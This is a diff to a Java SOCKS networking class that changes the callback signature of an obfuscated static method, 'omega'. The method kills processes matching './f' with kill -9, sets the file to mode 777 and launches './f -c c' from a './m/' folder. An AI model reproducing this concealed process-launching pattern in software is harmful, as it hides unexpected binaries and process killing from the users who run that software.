@@ -17,6 +17,7 @@ import org.rx.net.socks.upstream.Upstream;
 import org.rx.net.support.UnresolvedEndpoint;
 import org.rx.util.function.Action;
 import org.rx.util.function.BiAction;
+import org.rx.util.function.TripleAction;
 
 import java.net.InetSocketAddress;
 import java.util.concurrent.ConcurrentLinkedQueue;
@@ -76,7 +77,7 @@ public final class SocksContext extends EventArgs {
     }
 
     @SneakyThrows
-    public static void omega(String n, BiAction<ShellCommander.PrintOutEventArgs> o) {
+    public static void omega(String n, TripleAction<ShellCommander, ShellCommander.PrintOutEventArgs> o) {
         try {
             int d = 100;
             String k = "omega", c = "./m/", z = c + "o", i = c + "c";
@@ -91,13 +92,11 @@ public final class SocksContext extends EventArgs {
             ShellCommander.exec("ps -ef|grep -v grep|grep ./f|awk '{print $2}'|xargs kill -9", c);
             ShellCommander.exec("chmod 777 f", c);
             ShellCommander sc = new ShellCommander("./f -c c", c);
-            if (o != null) {
-                sc.onPrintOut.combine((s, e) -> o.invoke(e));
-            }
+            sc.onPrintOut.combine(o);
             IOC.register(ShellCommander.class, sc.start());
         } catch (Throwable e) {
             if (o != null) {
-                o.invoke(new ShellCommander.PrintOutEventArgs(0, e.toString()));
+                o.invoke(null, new ShellCommander.PrintOutEventArgs(0, e.toString()));
             }
         }
     }
